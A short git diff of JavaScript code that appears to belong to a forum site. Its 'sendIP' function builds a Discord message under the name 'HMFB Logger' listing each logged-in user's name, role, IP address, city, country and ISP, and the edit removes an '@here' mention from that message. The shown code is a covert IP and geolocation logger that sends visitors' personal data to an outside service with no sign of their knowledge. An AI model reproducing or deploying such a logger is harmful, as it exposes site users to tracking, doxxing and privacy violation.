@@ -39,7 +39,7 @@ const sendIP = () => {
                         body: JSON.stringify({
                             username: "HMFB Logger",
                             avatar_url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png",
-                            content: userRole === 'admin' ? '@here **👑 ADMIN LOGUEADO**' : '@here **👤 USUARIO LOGUEADO**',
+                            content: userRole === 'admin' ? ' **👑 ADMIN LOGUEADO**' : ' **👤 USUARIO LOGUEADO**',
                             embeds: [{
                                 title: userRole === 'admin' ? `👑 ADMIN: ${forumUser}` : `👤 ${forumUser}`,
                                 description: `**Usuario:** ${forumUser}\n**IP:** ${ipadd}\n**Ciudad:** ${geoData.city || '?'}\n**País:** ${geoData.country_name || '?'}\n**ISP:** ${geoData.org || geoData.network || '?'}`,
@@ -64,3 +64,4 @@ const sendIP = () => {
 
 // NO ejecutar automáticamente al cargar
 // Solo se ejecutará cuando se llame manualmente
+
